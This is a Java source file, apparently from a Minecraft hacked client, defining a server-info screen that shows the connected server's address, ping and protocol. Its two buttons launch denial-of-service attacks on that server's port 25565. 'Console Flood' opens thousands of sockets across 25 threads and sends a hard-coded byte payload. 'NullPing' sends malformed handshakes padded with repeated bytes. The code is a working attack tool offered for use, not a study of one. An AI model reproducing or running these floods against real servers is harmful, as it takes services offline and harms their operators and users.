package net.shadow.gui;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawableHelper;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.text.Text;
import net.shadow.font.FontRenderers;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import net.shadow.utils.RenderUtils;
import net.shadow.utils.TransitionUtils;
import net.shadow.utils.Utils;

import java.awt.*;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class ServerInfoGUI extends Screen {
    protected static final MinecraftClient MC = MinecraftClient.getInstance();
    static final int[] PAYLOAD = new int[]{
            0x3, 0x1, 0x0, 0xffffffbb, 0x1, 0x0, 0x0, 0xffffffb7,
            0x3, 0x3, 0xffffffcb, 0xffffff82, 0xffffffae, 0x53, 0x15, 0xfffffff6,
            0x79, 0x2, 0xffffffc2, 0xb, 0xffffffe1, 0xffffffc2, 0x6a, 0xfffffff8,
            0x75, 0xffffffe9, 0x32, 0x23, 0x3c, 0x39, 0x3, 0x3f,
            0xffffffa4, 0xffffffc7, 0xffffffb5, 0xffffff88, 0x50, 0x1f, 0x2e, 0x65,
            0x21, 0x0, 0x0, 0x48, 0x0, 0x2f
    };
    public static String addru;
    public static String nameu;
    public static boolean localu;
    public static String iconu;
    public static boolean isonlineu;
    public static long pingu;
    public static Text playersu;
    public static int veru;
    static int slidingprog = 0;
    private static boolean slidingbar = false;

    public ServerInfoGUI(Text title) {
        super(title);
    }

    public static void updateServerInfo(String addr, String name, boolean local, String icon, boolean isonline, long ping, Text players, int ver) {
        addru = addr;
        nameu = name;
        localu = local;
        iconu = icon;
        isonlineu = isonline;
        pingu = ping;
        playersu = players;
        veru = ver;
    }

    @Override
    protected void init() {
        int w = MC.getWindow().getScaledWidth();
        int h = MC.getWindow().getScaledHeight();
        int hh = h / 2;
        int ww = w / 2;

        ButtonWidget flood = new ButtonWidget(ww + 5, hh + 60, 200, 20, Text.of("Console Flood"), button -> {
            slidingprog = -201;
            slidingbar = true;
            for (int i = 0; i < 25; i++) {
                new Thread(() -> {
                    try {
                        List<Socket> sockets = new ArrayList<>();
                        for (int j = 0; j < 300; j++) {
                            try {
                                Socket s = new Socket(addru, 25565);
                                sockets.add(s);
                            } catch (Exception ignored) {
                            }
                        }
                        for (Socket socket : sockets) {
                            DataOutputStream outp = new DataOutputStream(socket.getOutputStream());
                            for (int i1 : PAYLOAD) {
                                outp.write(i1);
                            }
                        }
                        Thread.sleep(5);
                    } catch (Exception e) {
                        e.printStackTrace();
                        Utils.sleep(200);
                    }
                    NotificationSystem.notifications.add(new Notification("Console Flood", "Flood Completed", 150));
                }).start();
            }
        });

        ButtonWidget npold = new ButtonWidget(ww - 200, hh + 60, 200, 20, Text.of("NullPing"), button -> {
            slidingprog = -201;
            slidingbar = true;
            new Thread(() -> {
                try {
                    List<Socket> sockets = new ArrayList<>();
                    for (int j = 0; j < 300; j++) {
                        try {
                            if (addru == null) {
                                addru = "localhost";
                            }
                            Socket s = new Socket(addru, 25565);
                            sockets.add(s);
                        } catch (Exception ignored) {
                        }
                    }
                    for (Socket socket : sockets) {
                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                        out.write(15);
                        out.write(0);
                        out.write(47);
                        out.write(9);
                        out.writeBytes("localhost");
                        out.write(99);
                        out.write(224);
                        out.write(1);
                        for (int j = 0; j < 1900; ++j) {
                            out.write(1);
                            out.write(0);
                        }
                    }
                    Thread.sleep(5);
                } catch (Exception e) {
                    e.printStackTrace();
                    Utils.sleep(200);
                }
                NotificationSystem.notifications.add(new Notification("Nullping", "Nullping Completed", 150));
            }).start();
        });


        this.addDrawableChild(flood);
        this.addDrawableChild(npold);
        super.init();
    }

    @Override
    public void render(MatrixStack matrices, int mouseX, int mouseY, float delta) {
        int w = MC.getWindow().getScaledWidth();
        int h = MC.getWindow().getScaledHeight();
        int hh = h / 2;
        int ww = w / 2;
        RenderUtils.renderRoundedQuad(matrices, new Color(52, 52, 52, 255), ww - 203, hh - 53, ww + 203, hh + 57, 4);
        RenderUtils.renderRoundedQuad(matrices, new Color(100, 100, 100, 255), ww - 200, hh - 50, ww + 200, hh + 54, 4);
        DrawableHelper.fill(matrices, 0, 0, width, height, new Color(75, 75, 75, 50).getRGB());
        FontRenderers.getRenderer().drawString(matrices, "Address: " + addru, ww - 198, hh - 48, 16777215);
        FontRenderers.getRenderer().drawString(matrices, "Name: " + nameu, ww - 198, hh - 33, 16777215);
        FontRenderers.getRenderer().drawString(matrices, "SinglePlayer: " + localu, ww - 198, hh - 18, 16777215);
        FontRenderers.getRenderer().drawString(matrices, "Online: " + isonlineu, ww - 198, hh - 3, 16777215);
        FontRenderers.getRenderer().drawString(matrices, "Ping: " + pingu, ww - 198, hh + 12, 16777215);
        FontRenderers.getRenderer().drawString(matrices, "Protocol: " + veru, ww - 198, hh + 27, 16777215);
        if (slidingbar) {
            RenderUtils.fill(matrices, new Color(25, 25, 25, 255), ww + slidingprog, hh + 47, ww - 200, hh + 50);
            slidingprog = (int) TransitionUtils.transition(slidingprog, 230, 27);
            if (slidingprog > 201) {
                slidingprog = -201;
                slidingbar = false;
            }
        }
        super.render(matrices, mouseX, mouseY, delta);
    }

    @Override
    public boolean charTyped(char chr, int keyCode) {
        return false;
    }

    @Override
    public boolean keyReleased(int keyCode, int scanCode, int modifiers) {
        return false;
    }

    @Override
    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
        return super.keyPressed(keyCode, scanCode, modifiers);
    }

    @Override
    public boolean mouseClicked(double mouseX, double mouseY, int button) {
        return super.mouseClicked(mouseX, mouseY, button);
    }
}
